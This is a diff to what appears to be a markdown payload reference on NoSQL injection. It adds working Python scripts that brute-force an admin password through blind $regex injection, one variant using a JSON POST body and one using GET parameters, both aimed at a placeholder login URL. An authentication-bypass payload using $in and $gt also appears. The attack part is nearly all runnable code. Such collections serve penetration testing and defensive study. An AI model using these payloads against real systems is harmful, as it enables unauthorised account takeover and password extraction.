@@ -43,12 +43,15 @@ in JSON
 
 Extract data with "in"
 
-````json
+```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
 
 ## Blind NoSQL
+
+### POST with JSON body
+
 
 ```python
 import requests
@@ -59,15 +62,40 @@ urllib3.disable_warnings()
 
 username="admin"
 password=""
+u="http://example.org/login"
+headers={'content-type': 'application/json'}
 
 while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = {'ids': payload}, verify = False)
+            r = requests.post(u, data = payload, headers = headers, verify = False)
             if 'OK' in r.text:
                 print("Found one more char : %s" % (password+c))
                 password += c
+```
+
+### GET
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username='admin'
+password=''
+u='http://example.org/login'
+
+while True:
+  for c in string.printable:
+    if c not in ['*','+','.','?','|', '#', '&', '$']:
+      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
+      r = requests.get(u + payload)
+      if 'Yeah' in r.text:
+        print("Found one more char : %s" % (password+c))
+        password += c
 ```
 
 ## MongoDB Payloads
